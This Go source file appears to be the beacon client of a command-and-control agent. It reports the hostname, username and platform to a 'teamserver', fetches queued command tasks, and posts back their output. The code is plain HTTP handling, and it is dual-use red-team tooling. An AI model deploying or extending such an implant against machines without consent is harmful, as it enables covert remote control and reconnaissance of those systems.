package client

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"infrared/agent-go/internal/config"
)

type Client struct {
	baseURL string
	http    *http.Client
}

type CheckinRequest struct {
	AgentID  string            `json:"agent_id"`
	Hostname string            `json:"hostname,omitempty"`
	Username string            `json:"username,omitempty"`
	Platform string            `json:"platform,omitempty"`
	Metadata map[string]string `json:"metadata,omitempty"`
}

type CheckinResponse struct {
	Session Session `json:"session"`
}

type Session struct {
	SessionID string `json:"session_id"`
	AgentID   string `json:"agent_id"`
}

type TaskListResponse struct {
	Tasks []Task `json:"tasks"`
}

type Task struct {
	TaskID  int    `json:"task_id"`
	Command string `json:"command"`
	Status  string `json:"status"`
}

type ResultPostRequest struct {
	TaskID   int    `json:"task_id"`
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
	ExitCode int    `json:"exit_code"`
	Status   string `json:"status"`
}

type ResultResponse struct {
	TaskID   int    `json:"task_id"`
	Status   string `json:"status"`
	ExitCode int    `json:"exit_code"`
}

func New(baseURL string, timeout time.Duration) *Client {
	return &Client{
		baseURL: strings.TrimRight(baseURL, "/"),
		http: &http.Client{
			Timeout: timeout,
		},
	}
}

func LocalAgentInfo(cfg config.Config) (CheckinRequest, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return CheckinRequest{}, fmt.Errorf("hostname: %w", err)
	}

	username := ""
	if currentUser, err := user.Current(); err == nil {
		username = currentUser.Username
	}

	return CheckinRequest{
		AgentID:  cfg.AgentID,
		Hostname: hostname,
		Username: username,
		Platform: runtime.GOOS,
		Metadata: cfg.Metadata,
	}, nil
}

func (c *Client) CheckIn(ctx context.Context, payload CheckinRequest) (Session, error) {
	var response CheckinResponse
	if err := c.do(ctx, http.MethodPost, "/api/agent/checkin", payload, &response); err != nil {
		return Session{}, err
	}
	return response.Session, nil
}

func (c *Client) Tasks(ctx context.Context, agentID string) ([]Task, error) {
	var response TaskListResponse
	path := "/api/agent/" + url.PathEscape(agentID) + "/tasks"
	if err := c.do(ctx, http.MethodGet, path, nil, &response); err != nil {
		return nil, err
	}
	return response.Tasks, nil
}

func (c *Client) PostResult(ctx context.Context, agentID string, payload ResultPostRequest) (ResultResponse, error) {
	var response ResultResponse
	path := "/api/agent/" + url.PathEscape(agentID) + "/results"
	if err := c.do(ctx, http.MethodPost, path, payload, &response); err != nil {
		return ResultResponse{}, err
	}
	return response, nil
}

func (c *Client) do(ctx context.Context, method string, path string, payload any, target any) error {
	var body *bytes.Reader
	if payload == nil {
		body = bytes.NewReader(nil)
	} else {
		raw, err := json.Marshal(payload)
		if err != nil {
			return fmt.Errorf("encode request: %w", err)
		}
		body = bytes.NewReader(raw)
	}

	request, err := http.NewRequestWithContext(ctx, method, c.baseURL+path, body)
	if err != nil {
		return fmt.Errorf("create request: %w", err)
	}
	request.Header.Set("Accept", "application/json")
	if payload != nil {
		request.Header.Set("Content-Type", "application/json")
	}

	response, err := c.http.Do(request)
	if err != nil {
		return fmt.Errorf("%s %s: %w", method, path, err)
	}
	defer response.Body.Close()

	if response.StatusCode < 200 || response.StatusCode > 299 {
		return fmt.Errorf("%s %s: teamserver returned %s", method, path, response.Status)
	}

	if target == nil {
		return nil
	}
	if err := json.NewDecoder(response.Body).Decode(target); err != nil {
		return fmt.Errorf("decode response: %w", err)
	}
	return nil
}
